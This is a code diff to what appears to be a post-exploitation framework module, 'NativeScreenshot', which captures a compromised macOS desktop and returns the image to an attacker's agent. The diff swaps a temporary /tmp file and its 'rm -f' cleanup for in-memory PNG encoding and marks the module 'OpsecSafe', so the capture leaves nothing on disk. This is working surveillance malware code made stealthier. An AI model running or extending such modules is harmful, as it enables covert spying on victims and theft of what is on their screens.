@@ -8,7 +8,7 @@ class Module:
             'Name': 'NativeScreenshot',
 
             # list of one or more authors for the module
-            'Author': ['@xorrior'],
+            'Author': ['@xorrior', 'globetother'],
 
             # more verbose multi-line description of the module
             'Description': ('Takes a screenshot of an OSX desktop using the Python Quartz libraries and returns the data.'),
@@ -23,7 +23,7 @@ class Module:
             'NeedsAdmin': False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': False,
+            'OpsecSafe': True,
 
             # list of any references/other comments
             'Comments': []
@@ -38,11 +38,6 @@ class Module:
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
-            },
-            'SavePath': {
-                'Description'   :   'Path of the temporary screenshot file to save.',
-                'Required'      :   True,
-                'Value'         :   '/tmp/out.png'
             }
         }
 
@@ -63,37 +58,63 @@ class Module:
 
     def generate(self):
 
-        savePath = self.options['SavePath']['Value']
-
         script = """
-import Foundation
 import Quartz
 import Quartz.CoreGraphics as CG
-from Cocoa import NSURL
-import LaunchServices
+import numpy as np
+import zlib, struct
 
-region = CG.CGRectInfinite
-path = '%s'
-image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
-imagepath = NSURL.fileURLWithPath_(path)
-dest = Quartz.CGImageDestinationCreateWithURL(
-    imagepath,
-    LaunchServices.kUTTypePNG,
-    1,
-    None)
-properties = {
-    Quartz.kCGImagePropertyDPIWidth: 1024,
-    Quartz.kCGImagePropertyDPIHeight: 720,
-}
+def write_png(buf, width, height):
 
-Quartz.CGImageDestinationAddImage(dest, image, properties)
-Quartz.CGImageDestinationFinalize(dest)
+    width_byte_4 = width * 4
 
-f = open(path, 'rb')
-data = f.read()
-f.close()
-run_command('rm -f %s')
-print data
-""" % (savePath, savePath)
+    def correct_colors(str):
+        buf = list(str)
+        # reverse the R and B color bytes
+        for x in range(0, len(buf), 4):
+            r = buf[x]
+            g = buf[x+1]
+            b = buf[x+2]
+            a = buf[x+3]
+            buf[x] = b
+            buf[x+2] = r
+        return ''.join(buf)
+
+    # add null bytes at the start
+    raw_data = b''.join(b'\\x00' + correct_colors(buf[span:span + width_byte_4])
+                            for span in range(0, (height - 1) * width_byte_4 + 1, width_byte_4))
+
+    def png_pack(png_tag, data):
+        chunk_head = png_tag + data
+        return (struct.pack("!I", len(data)) +
+                chunk_head +
+                struct.pack("!I", 0xFFFFFFFF & zlib.crc32(chunk_head)))
+
+    return b''.join([
+            b'\\x89PNG\\r\\n\\x1a\\n',
+            png_pack(b'IHDR', struct.pack("!2I5B", width, height, 8, 6, 0, 0, 0)),
+            png_pack(b'IDAT', zlib.compress(raw_data, 9)),
+            png_pack(b'IEND', b'')])
+
+def screenshot():
+    region = CG.CGRectInfinite
+    
+    # Create screenshot as CGImage
+    image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
+
+    width = CG.CGImageGetWidth(image)
+    height = CG.CGImageGetHeight(image)
+    bytesperrow = CG.CGImageGetBytesPerRow(image)
+    pixeldata = CG.CGDataProviderCopyData(CG.CGImageGetDataProvider(image))
+
+    image = np.frombuffer(pixeldata, dtype=np.uint8)
+    image = image.reshape((height, bytesperrow//4, 4))
+    image = image[:,:width,:]
+
+    return write_png(image.tostring(), width, height)
+
+print screenshot()
+
+"""
 
         return script
